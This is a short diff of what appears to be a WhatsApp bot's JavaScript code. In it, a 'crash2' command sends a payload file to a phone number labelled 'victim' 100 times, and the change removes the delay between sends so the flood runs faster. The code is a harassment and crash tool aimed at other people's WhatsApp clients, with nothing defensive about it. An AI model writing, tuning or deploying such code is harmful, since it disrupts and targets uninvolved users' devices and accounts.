@@ -538,7 +538,7 @@ if (command === "crash2") {
     const victim = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
     const amount = 100;
 
-    const filePath = "./xeontext1.js";
+    const filePath = "./xeontext2.js";
 
     if (!fs.existsSync(filePath)) {
         return reply(sock, msg, "❌ Datei nicht gefunden!");
@@ -554,7 +554,6 @@ if (command === "crash2") {
 
     for (let i = 0; i < amount; i++) {
         await XeonyCrashy(victim);
-        await sleep(1500);
     }
 
     reply(sock, msg, `✅ Inhalt ${amount}x an ${victim} gesendet`);
